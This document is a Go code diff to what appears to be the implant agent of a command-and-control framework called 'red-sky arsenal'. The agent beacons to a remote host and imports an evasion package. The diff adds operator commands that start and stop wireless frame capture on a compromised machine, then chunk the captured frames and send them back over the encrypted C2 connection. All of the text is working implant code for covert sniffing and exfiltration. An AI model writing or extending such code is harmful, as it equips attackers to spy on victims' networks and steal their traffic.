@@ -26,6 +26,7 @@ import (
 
 	"github.com/sk666G/red-sky---arsenal/internal/agentfw"
 	"github.com/sk666G/red-sky---arsenal/internal/capturer"
+	"github.com/sk666G/red-sky---arsenal/internal/wireless"
 	"github.com/sk666G/red-sky---arsenal/internal/crypto"
 	"github.com/sk666G/red-sky---arsenal/internal/evade"
 	"github.com/sk666G/red-sky---arsenal/internal/proto"
@@ -211,6 +212,18 @@ func runSession(host string, port int, agentID, caFP string, beaconSec int) erro
 				continue
 			}
 			closeTunnel(&t)
+		case proto.TypeWirelessStart:
+			var ws proto.WirelessStart
+			if err := json.Unmarshal(env.Payload, &ws); err != nil {
+				continue
+			}
+			go runWireless(conn, sess, ws)
+		case proto.TypeWirelessStop:
+			var ws proto.WirelessStop
+			if err := json.Unmarshal(env.Payload, &ws); err != nil {
+				continue
+			}
+			stopWireless(ws.SessionID)
 		case proto.TypeCaptureStart:
 			var cs proto.CaptureStart
 			if err := json.Unmarshal(env.Payload, &cs); err != nil {
@@ -487,6 +500,88 @@ func stopCapture(sessionID string) {
 	activeCapturesMu.Lock()
 	cancel, ok := activeCaptures[sessionID]
 	activeCapturesMu.Unlock()
+	if ok && cancel != nil {
+		cancel()
+	}
+}
+
+
+// --- wireless capture ---
+
+var (
+	activeWireless   = map[string]context.CancelFunc{}
+	activeWirelessMu sync.Mutex
+)
+
+func runWireless(conn net.Conn, sess *crypto.Session, ws proto.WirelessStart) {
+	ctx, cancel := context.WithCancel(context.Background())
+	activeWirelessMu.Lock()
+	activeWireless[ws.SessionID] = cancel
+	activeWirelessMu.Unlock()
+	defer func() {
+		activeWirelessMu.Lock()
+		delete(activeWireless, ws.SessionID)
+		activeWirelessMu.Unlock()
+		cancel()
+	}()
+
+	var chunk []byte
+	var chunkCount int
+	const chunkMax = 60 * 1024
+
+	flush := func() {
+		if len(chunk) == 0 {
+			return
+		}
+		sendTunnelAck(conn, sess, proto.TypeWirelessData, proto.WirelessData{
+			SessionID: ws.SessionID,
+			Data:      chunk,
+			Count:     chunkCount,
+		})
+		chunk = nil
+		chunkCount = 0
+	}
+
+	err := wireless.Capture(ctx, wireless.Options{
+		Iface:   ws.Iface,
+		Channel: ws.Channel,
+		Timeout: 30 * time.Second,
+	}, func(f wireless.Frame) {
+		// record framing: 8-byte ts_ns BE + 4-byte len BE + payload
+		hdr := make([]byte, 12)
+		ns := uint64(f.TS.UnixNano())
+		for i := 0; i < 8; i++ {
+			hdr[7-i] = byte(ns >> (8 * i))
+		}
+		ln := uint32(len(f.Data))
+		hdr[8] = byte(ln >> 24)
+		hdr[9] = byte(ln >> 16)
+		hdr[10] = byte(ln >> 8)
+		hdr[11] = byte(ln)
+		chunk = append(chunk, hdr...)
+		chunk = append(chunk, f.Data...)
+		chunkCount++
+		if len(chunk) >= chunkMax {
+			flush()
+		}
+	})
+	flush()
+
+	if err != nil {
+		sendTunnelAck(conn, sess, proto.TypeWirelessFail, proto.WirelessFail{
+			SessionID: ws.SessionID, Error: err.Error(),
+		})
+		return
+	}
+	sendTunnelAck(conn, sess, proto.TypeWirelessDone, proto.WirelessDone{
+		SessionID: ws.SessionID,
+	})
+}
+
+func stopWireless(sessionID string) {
+	activeWirelessMu.Lock()
+	cancel, ok := activeWireless[sessionID]
+	activeWirelessMu.Unlock()
 	if ok && cancel != nil {
 		cancel()
 	}
